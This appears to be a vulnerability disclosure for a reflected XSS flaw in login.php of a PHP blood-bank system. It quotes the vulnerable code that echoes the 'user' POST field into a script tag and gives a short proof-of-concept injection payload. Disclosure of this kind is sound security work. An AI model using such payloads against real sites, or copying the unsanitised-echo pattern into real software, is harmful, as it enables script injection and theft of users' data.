# blood-bank-system-in-php-with-source-code  via to  XSS

****

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites:**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

login.php

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

- XSS

## Root Cause

The vulnerability file is in the root directory of login.php via $user parameter。 We can construct a payload to trigger XSS via user.

```
   if(isset($_POST['sub']))
      {

        $user=$_POST['user'];
        $pass=$_POST['pass'];
        echo"<script>alert('$user')</script>";

```

![image-20240826120015290](https://github.com/user-attachments/assets/66ae2e65-cf4c-438f-89ba-01c0bd1c3b3c)

## Impact

XSS vulnerability, which can construct a malicious website and obtain the user's login information.You can also get the name of the computer through XSS.

## **Description of the vulnerability**

**blood-bank-system-in-php** login.php .There is an XSS vulnerability in the foreground user of the system, which can execute JS scripts and obtain user information through the vulnerability

## **Vulnerability recurrence**

We need to set up this **blood-bank-system-in-php** website locally

**POC**

```
1');</script><script>alert('xss');</script>
```

![image-20240826120638125](https://github.com/user-attachments/assets/8ed368c7-e5b4-41f6-ae88-26de4c54802e)

**Result**

![image-20240826120651243](https://github.com/user-attachments/assets/7e160141-6484-47d2-b97e-5d37ebab8c16)